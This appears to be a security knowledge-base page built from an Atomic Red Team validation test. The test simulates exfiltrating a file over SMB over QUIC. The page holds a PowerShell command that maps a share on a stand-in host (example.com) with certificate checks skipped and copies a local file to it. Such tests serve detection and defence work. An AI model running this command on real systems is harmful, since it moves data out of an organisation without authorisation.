---
atomic_guid: "d8d13303-159e-4f33-89f4-9f07812d016f"
title: "Exfiltration Over SMB over QUIC (New-SmbMapping)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1570"
attack_technique_name: "Lateral Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1570/T1570.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "d8d13303-159e-4f33-89f4-9f07812d016f"
  - "Exfiltration Over SMB over QUIC (New-SmbMapping)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Exfiltration Over SMB over QUIC (New-SmbMapping)

Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.
Prerequisites:
  - A file server running Windows Server 2022 Datacenter: Azure Edition
  - A Windows 11 computer
  - Windows Admin Center

## Metadata

- Atomic GUID: d8d13303-159e-4f33-89f4-9f07812d016f
- Technique: T1570: Lateral Tool Transfer
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1570/T1570.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1570-lateral_tool_transfer|T1570]]

## Input Arguments

### local_file

- description: The local file to be transferred
- type: path
- default: C:\path\to\file.txt

### remote_path

- description: The UNC path to the share on the file server
- type: string
- default: \\example.com\sales

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck
copy '#{local_file}' 'Z:\'
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1570/T1570.yaml)
